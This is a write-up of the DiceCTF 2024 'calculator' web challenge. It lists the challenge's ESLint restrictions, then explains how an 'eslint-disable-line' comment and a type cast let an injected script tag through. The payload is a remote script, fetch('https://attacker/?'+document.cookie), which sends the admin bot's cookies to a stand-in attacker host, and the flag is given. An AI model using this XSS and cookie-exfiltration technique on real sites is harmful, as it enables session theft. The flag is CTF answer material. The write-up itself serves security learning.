# DiceCTF 2024 calculator writeup
beep boop

Files: website 
Links: adminbot

Solves: 59

## Solution
This challenge is a spin on the classic javascript calculator challenge. What makes this one different is that you enter typescript code that is sanitized and run through eslint. The challenge author set a LOT of restrictions for what we can enter:

```javascript
rules: {
    '@typescript-eslint/await-thenable': 'error',
    '@typescript-eslint/ban-ts-comment': 'error',
    '@typescript-eslint/ban-tslint-comment': 'error',
    '@typescript-eslint/ban-types': 'error',
    'no-array-constructor': 'error',
    '@typescript-eslint/no-array-constructor': 'error',
    '@typescript-eslint/no-array-delete': 'error',
    '@typescript-eslint/no-base-to-string': 'error',
    '@typescript-eslint/no-confusing-void-expression': 'error',
    '@typescript-eslint/no-duplicate-enum-values': 'error',
    '@typescript-eslint/no-duplicate-type-constituents':
        'error',
    '@typescript-eslint/no-dynamic-delete': 'error',
    '@typescript-eslint/no-explicit-any': 'error',
    '@typescript-eslint/no-extra-non-null-assertion': 'error',
    '@typescript-eslint/no-extraneous-class': 'error',
    '@typescript-eslint/no-floating-promises': 'error',
    '@typescript-eslint/no-for-in-array': 'error',
    'no-implied-eval': 'error',
    '@typescript-eslint/no-implied-eval': 'error',
    '@typescript-eslint/no-invalid-void-type': 'error',
    'no-loss-of-precision': 'off',
    '@typescript-eslint/no-loss-of-precision': 'error',
    '@typescript-eslint/no-meaningless-void-operator': 'error',
    '@typescript-eslint/no-misused-new': 'error',
    '@typescript-eslint/no-misused-promises': 'error',
    '@typescript-eslint/no-mixed-enums': 'error',
    '@typescript-eslint/no-namespace': 'error',
    '@typescript-eslint/no-non-null-asserted-nullish-coalescing':
        'error',
    '@typescript-eslint/no-non-null-asserted-optional-chain':
        'error',
    '@typescript-eslint/no-non-null-assertion': 'error',
    '@typescript-eslint/no-redundant-type-constituents':
        'error',
    '@typescript-eslint/no-this-alias': 'error',
    'no-throw-literal': 'error',
    '@typescript-eslint/no-throw-literal': 'error',
    '@typescript-eslint/no-unnecessary-boolean-literal-compare':
        'error',
    '@typescript-eslint/no-unnecessary-condition': 'error',
    '@typescript-eslint/no-unnecessary-type-arguments': 'error',
    '@typescript-eslint/no-unnecessary-type-assertion': 'error',
    '@typescript-eslint/no-unnecessary-type-constraint':
        'error',
    '@typescript-eslint/no-unsafe-argument': 'error',
    '@typescript-eslint/no-unsafe-assignment': 'error',
    '@typescript-eslint/no-unsafe-call': 'error',
    '@typescript-eslint/no-unsafe-declaration-merging': 'error',
    '@typescript-eslint/no-unsafe-enum-comparison': 'error',
    '@typescript-eslint/no-unsafe-member-access': 'error',
    '@typescript-eslint/no-unsafe-return': 'error',
    'no-unused-vars': 'error',
    '@typescript-eslint/no-unused-vars': 'error',
    'no-useless-constructor': 'error',
    '@typescript-eslint/no-useless-constructor': 'error',
    '@typescript-eslint/no-useless-template-literals': 'error',
    '@typescript-eslint/no-var-requires': 'error',
    '@typescript-eslint/prefer-as-const': 'error',
    '@typescript-eslint/prefer-includes': 'error',
    '@typescript-eslint/prefer-literal-enum-member': 'error',
    'prefer-promise-reject-errors': 'error',
    '@typescript-eslint/prefer-promise-reject-errors': 'error',
    '@typescript-eslint/prefer-reduce-type-parameter': 'error',
    '@typescript-eslint/prefer-return-this-type': 'error',
    '@typescript-eslint/prefer-ts-expect-error': 'error',
    'require-await': 'error',
    '@typescript-eslint/require-await': 'error',
    '@typescript-eslint/restrict-plus-operands': 'error',
    '@typescript-eslint/restrict-template-expressions': 'error',
    '@typescript-eslint/triple-slash-reference': 'error',
    '@typescript-eslint/unbound-method': 'error',
    '@typescript-eslint/unified-signatures': 'error',
    '@typescript-eslint/consistent-type-assertions': [
        'error',
        { assertionStyle: 'never' },
    ],
}
```

Our query also faces a `75` character limit:
```javascript
if (query.length > 75) {
    return 'equation is too long'
}
```

And it is made sure that the return type is compatible with a number:
```javascript
const value: number = result.value
return `result: ${value.toString()}`
```

Ultimately with this challenge we need to find a way to steal the flag that is stored in the admin bots cookies.  

After some googling it turns out that ESLint rules can be disabled by writing specific comments in the code as seen [here](https://eslint.org/docs/latest/use/configure/rules#disabling-rules).  

Using the comment to disable the linter rules, we can get away with a lot more and then use some typescript magic to set a string to type any, which is able to be interpreted as a number later on. To deal with the character limit, we host our true payload elsewhere and use script src to get it.

Payload:
```typescript
<any>'<script src="shortened link to payload .js"></script>'/*eslint-disable-line*/
```
Contents of script that we fetch:
```javascript
fetch("https://attacker/?"+document.cookie)
```

Combining these we are able to send the payload to the admin bot and get the flag:
dice{society_if_typescript_were_sound}
